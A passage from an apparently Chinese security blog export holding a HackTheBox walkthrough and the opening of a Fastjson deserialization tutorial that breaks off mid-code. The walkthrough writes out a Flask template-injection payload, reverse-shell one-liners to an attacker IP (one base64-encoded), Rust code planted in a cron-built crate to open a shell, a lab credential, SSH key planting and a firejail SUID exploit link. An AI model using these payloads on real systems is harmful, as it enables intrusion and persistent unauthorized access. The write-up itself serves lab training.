<pre class="line-numbers language-none"><code class="language-none">gobuster dir -u https://ssa.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html -t 50 -k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143621492.png"></p>
<p>有几个非常规目录</p>
<p><code>/admin</code>如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143412051.png" style="zoom:67%;">

<p><code>/guide</code>如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143702183.png" style="zoom:67%;">

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155645054.png" style="zoom:67%;">

<p>有通过PGP公钥验证签名的功能，如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155716430.png" style="zoom:67%;">

<p>页面底部还有一段被签名的消息，如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180453944.png" style="zoom:67%;">

<p><code>/pgp</code>如下图，是PGP公钥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102143757596.png"></p>
<p>那么可以把此处的公钥和<code>/guide</code>页面底部被签名的消息，填入到<code>/guide</code>页面验证签名功能对应的文本框中，点击验证签名后，弹出如下内容</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180845906.png" style="zoom:67%;">

<p>与<code>/guide</code>页面底部的提示说明一致，说明签名验证成功，消息的机密性、可用性、完整性被保证</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103180944253.png" style="zoom: 80%;">

<p>从<code>/guide</code>页面的版权标志处看出用的python Flask框架，此框架主要漏洞就是SSTI（Server Side Template Injection），此处PGP签名功能有交互，可以在此处用这个功能做测试</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103181120088.png"></p>
<h2 id="三、Flask-SSTI（服务端模板注入）"><a href="#三、Flask-SSTI（服务端模板注入）" class="headerlink" title="三、Flask SSTI（服务端模板注入）"></a>三、Flask SSTI（服务端模板注入）</h2><p>那么在本地kali上，用gpg生成公私钥对</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --gen-key	#生成密钥对
Real name: {{100*100}}	#测试模板注入，如果被执行，会显示10000
Email address: &lt;any_mail&gt;（邮箱随意，此处采用在/guide页面底部发现的atlas@ssa.htb）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102155959507.png"></p>
<pre class="line-numbers language-none"><code class="language-none">gpg --list-keys	#列出所有公私钥对<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102160233547.png"></p>
<p>将指定电子邮件地址（此处是<code>atlas@ssa.htb</code>）的公钥导出为文本格式，并将它保存到<code>public_key.asc</code>文件中</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --armor --export atlas@ssa.htb &gt; public_key.asc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>--armor</code>: 这个选项指示 GnuPG 导出的密钥应该以文本格式（ASCII armored）导出，而不是二进制格式。ASCII armored 密钥更易于共享和传输，通常用于通过电子邮件或文本文件分享公钥。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162102538.png"></p>
<p>创建一个名为<code>message.txt</code>的文本文件，其中包含消息<code>test</code>。使用 GnuPG 对<code>message.txt</code>文件中的消息<code>test</code>进行数字签名，并将带有数字签名的消息保存为 <code>signed_message.asc</code>。这个签名可以用于验证消息的完整性和来源，确保它没有被篡改，并由私钥持有者签名。</p>
<pre class="line-numbers language-none"><code class="language-none">echo "test" &gt; message.txt
gpg --clear-sign --output signed_message.asc message.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>--clear-sign</code>: 这个选项告诉 GnuPG 对消息执行<code>clear sign</code>，这意味着数字签名将被添加到消息的末尾，并且消息内容本身保持可读性。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162129479.png"></p>
<p>查看公钥<code>public_key.asc</code>和被签名的消息 <code>signed_message.asc</code>。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162229279.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162245776.png"></p>
<p>分别填入到<code>/guide</code>页面对应的文本框里，验证签名</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162402747.png" style="zoom: 50%;">

<p>发现弹出如下内容，其中包含有执行模板注入表达式的结果10000</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162535692.png" style="zoom: 67%;">

<p>确认存在模板注入，就可以尝试执行命令。先删除之前生成的密钥对</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --delete-secret-keys atlas@ssa.htb
gpg --delete-keys atlas@ssa.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162937665.png" style="zoom: 80%;">

<p>重新生成密钥对，在<code>Real name</code>填入如下内容</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102163228026.png"></p>
<p>然后按照之前的思路导出公钥和被签名的消息，重新验证，弹窗如下，命令<code>id</code>被成功执行</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102163523356.png" style="zoom: 67%;">

<p>反弹shell如下</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1"').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102172511899.png"></p>
<p>生成密钥提示<code>Real name</code>不能有尖括号，那就把base64编码payload，如下</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzk4OTggMD4mMSI=" | base64 -d | bash').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102172842772.png"></p>
<p>然后按照之前的思路验证签名，开启监听，成功获取到<code>atlas</code>用户的shell权限</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102173053293.png" style="zoom: 80%;">

<p>在home目录看到还有一个用户<code>silentboserver</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102175857783.png"></p>
<p>在如下文件找到用户<code>silentboserver</code>的口令</p>
<pre class="line-numbers language-none"><code class="language-none">/home/atlas/.config/httpie/sessions/localhost_5000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102180054542.png"></p>
<pre class="line-numbers language-none"><code class="language-none">username: silentobserver
password: quietLiketheWind22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连接</p>
<pre class="line-numbers language-none"><code class="language-none">ssh silentobserver@10.10.11.218<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102180300347.png"></p>
<h2 id="四、Rust计划任务提权"><a href="#四、Rust计划任务提权" class="headerlink" title="四、Rust计划任务提权"></a>四、Rust计划任务提权</h2><p>上传运行pspy64，可看到有计划任务会以<code>atlas</code>用户身份执行<code>/opt/tipnet</code>目录下的文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103143804226.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103143934128.png"></p>
<p>上传linpeas，添加可执行权限，运行，发现如下文件存在SUID</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103100443185.png"></p>
<p><code>firejail</code>可以suid提权，利用脚本：<a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
<p>但是<code>firejail</code>文件的属组是<code>jailer</code>，linpeas结果可以看到<code>atlas</code>用户的属组是<code>jailer</code>，但是此时我们连接的是<code>silentobserver</code>用户的ssh账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103103658116.png"></p>
<p>之前有个反弹得到的<code>atlas</code>用户的shell权限</p>
<p>用反弹shell的命令行窗口从本地kali获取脚本，提示命令未找到，那可能这个shell是web权限，比较低。有计划任务会以<code>atlas</code>用户身份执行<code>/opt/tipnet</code>目录，那么就可以尝试通过此计划任务来反弹一个shell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103104636857.png"></p>
<p>此时看另一个可疑的suid文件，在它的同级目录下发现如下内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103105843673.png"></p>
<p>对于<code>silentobserver</code>用户，只有<code>/opt/crates/logger/src/lib.rs</code>有可写权限</p>
<p>参考：<a href="https://doc.rust-lang.org/std/process/struct.Command.html">https://doc.rust-lang.org/std/process/struct.Command.html</a></p>
<p>在<code>/opt/crates/logger/src/lib.rs</code>添加如下Rust代码，尝试反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">use std::process::Command;

    let output = Command::new("bash")
        .arg("-c")
        .arg("bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1")
        .output()
        .expect("failed to execute process");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103145936364.png"></p>
<p>开启监听，稍等片刻，成功反弹获得atlas用户jailer组的shell权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103150047556.png"></p>
<h3 id="ssh公钥伪造实现权限维持"><a href="#ssh公钥伪造实现权限维持" class="headerlink" title="ssh公钥伪造实现权限维持"></a>ssh公钥伪造实现权限维持</h3><p>由于每次执行完此定时任务后，<code>/opt/crates/logger/src/lib.rs</code>会自动恢复成原来的样子。这样如果shell断了，想要重连，又要重新修改文件并等待反弹。另外在此处发现<code>atlas</code>的<code>home</code>目录下有<code>.ssh</code>目录，那么就可以尝试ssh公钥伪造登录。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103152343710.png"></p>
<p>本地kali生成rsa公钥和私钥，分别默认保存在<code>/root/.ssh/id_rsa.pub</code>和<code>/root/.ssh/id_rsa</code></p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa	#两次默认回车即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>开启http服务，把公钥<code>id_rsa.pub</code>传输到目标靶机<code>/home/atlas/.ssh</code>目录下，并重命名为<code>authorized_keys</code></p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/id_rsa.pub -O authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后本地执行如下命令登录ssh</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa atlas@10.10.11.218<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103153009729.png"></p>
<h2 id="五、firejail-SUID提权"><a href="#五、firejail-SUID提权" class="headerlink" title="五、firejail SUID提权"></a>五、firejail SUID提权</h2><p>上传firejail的利用脚本并执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154520467.png"></p>
<p>重开一个ssh窗口，执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">firejail --join=&lt;number&gt;
su -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154538708.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154714757.png" style="zoom:67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Flask模板注入</tag>
        <tag>Rust计划任务提权</tag>
        <tag>firejail提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson系列漏洞复现及原理调试分析</title>
    <url>/posts/d5d1bb40.html</url>
    <content><![CDATA[<h1 id="Fastjson系列漏洞复现及原理调试分析"><a href="#Fastjson系列漏洞复现及原理调试分析" class="headerlink" title="Fastjson系列漏洞复现及原理调试分析"></a>Fastjson系列漏洞复现及原理调试分析</h1><h2 id="Fastjson前置知识"><a href="#Fastjson前置知识" class="headerlink" title="Fastjson前置知识"></a>Fastjson前置知识</h2><h3 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h3><p>开发环境：IDEA2021.2.1、JDK1.7.0_76（此处选用1.7.0_76是为了方便后续测试）</p>
<p>新建一个 Maven 项目，名称叫<code>Fastjson_demo</code>，编辑<code>pom.xml</code>文件如下</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>Fastjson_demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后右键单击<code>pom.xml</code>选择<code>Download Sources and Documentation</code></p>
<p>首先新建一个简单的 Student 类，<code>Student.class</code>，其中包含两个属性及其<code>getter</code>/<code>setter</code>方法，还有类的构造函数：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="JSON-toJsonString-及其SerializerFeature-WriteClassName属性"><a href="#JSON-toJsonString-及其SerializerFeature-WriteClassName属性" class="headerlink" title="JSON.toJsonString()及其SerializerFeature.WriteClassName属性"></a><code>JSON.toJsonString()</code>及其<code>SerializerFeature.WriteClassName</code>属性</h4><p>然后新建一个<code>TestFastJson.java</code>，调用<code>JSON.toJsonString()</code>来序列化 Student 类对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJson</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        student<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Hello Fastjson!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        student<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>student<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Fastjson 利用<code>toJSONString</code>方法来序列化对象，<code>SerializerFeature.WriteClassName</code>是<code>JSON.toJSONString()</code>中的一个设置属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写入被序列化的类名。type 可以指定反序列化的类，并且调用其<code>getter</code>/<code>setter</code>/<code>is</code>方法，而问题恰恰出在这个特性，Fastjson接收的 JSON 可以通过<code>@type</code>字段来指定反序列化时该 JSON 应当还原成何种类型的对象，我们可以配合一些存在问题的类，进一步造成 RCE。</p>
<p>执行<code>TestFastJson.java</code>输出：</p>
<pre class="line-numbers language-none"><code class="language-none"># 设置了SerializerFeature.WriteClassName属性
Student构造函数
Student setName
Student setAge
Student getAge
Student getName
{"@type":"fastjson.Student","age":18,"name":"Hello Fastjson!"}

# 未设置SerializerFeature.WriteClassName属性
Student构造函数
Student setName
Student setAge
Student getAge
Student getName
{"age":18,"name":"Hello Fastjson!"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="JSON-parseObject-和JSON-parse"><a href="#JSON-parseObject-和JSON-parse" class="headerlink" title="JSON.parseObject()和JSON.parse()"></a><code>JSON.parseObject()</code>和<code>JSON.parse()</code></h4><p>反序列化的API主要有两个，分别是<code>JSON.parseObject()</code>和<code>JSON.parse()</code>，最主要的区别就是<code>JSON.parseObject()</code>在<strong>未指定目标类的前提下</strong>返回的是 JSONObject，而<code>JSON.parse()</code>返回的是实际类的对象。</p>
<p><code>parseObject()</code>本质上也是调用<code>parse()</code>进行反序列化的。但是<code>parseObject()</code>会额外将 Java 对象转为 JSONObject 对象，即<code>JSON.toJSON(obj)</code>。</p>
<p>所以反序列化时的细节区别在于：</p>
<p><code>parse()</code>会识别并调用目标类的 setter 方法及<strong>某些特定条件的 getter 方法</strong>；</p>
<p>而<code>parseObject()</code>由于多执行了<code>JSON.toJSON(obj)</code>，因此在处理过程中会调用反序列化目标类的<strong>所有 setter 和 getter 方法</strong>。</p>
<p><code>TestFastJsonDeserialize.class</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
